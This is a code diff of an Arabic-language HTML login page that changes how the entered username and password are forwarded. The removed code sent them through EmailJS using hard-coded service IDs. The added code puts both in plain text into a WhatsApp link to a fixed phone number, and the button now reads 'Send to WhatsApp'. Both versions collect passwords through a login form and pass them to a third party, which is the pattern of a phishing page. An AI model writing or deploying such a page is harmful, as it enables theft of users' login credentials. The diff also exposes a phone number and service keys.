@@ -39,7 +39,7 @@
         }
 
         form button {
-            background-color: #4CAF50;
+            background-color: #25D366;
             color: white;
             border: none;
             padding: 10px 20px;
@@ -49,7 +49,7 @@
         }
 
         form button:hover {
-            background-color: #45a049;
+            background-color: #128C7E;
         }
     </style>
 </head>
@@ -60,36 +60,24 @@
         <form id="login-form">
             <input type="text" id="username" name="username" placeholder="اسم المستخدم" required>
             <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
-            <button type="submit">تسجيل الدخول</button>
+            <button type="submit">إرسال إلى WhatsApp</button>
         </form>
     </div>
 
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // تهيئة EmailJS
-        emailjs.init("1xqwBMfecM1SSulsh");
-
-        // عندما يتم إرسال النموذج
         document.getElementById('login-form').onsubmit = function(event) {
             event.preventDefault();
 
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // إنشاء الرسالة
-            const message = {
-                username: username,
-                password: password
-            };
+            // إعداد رابط WhatsApp مع النص المرسل
+            const message = `اسم المستخدم: ${username} \nكلمة المرور: ${password}`;
+            const phoneNumber = "0504104065";  // رقم الهاتف
+            const url = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
 
-            // إرسال البيانات عبر EmailJS
-            emailjs.send("service_ir3vg5y", "template_jw2qkzr", message)
-                .then(function(response) {
-                    alert("تم إرسال البيانات بنجاح!");
-                }, function(error) {
-                    alert("فشل في إرسال البيانات. حاول مرة أخرى.");
-                    console.error(error);
-                });
+            // فتح رابط WhatsApp
+            window.open(url, '_blank');
         };
     </script>
 
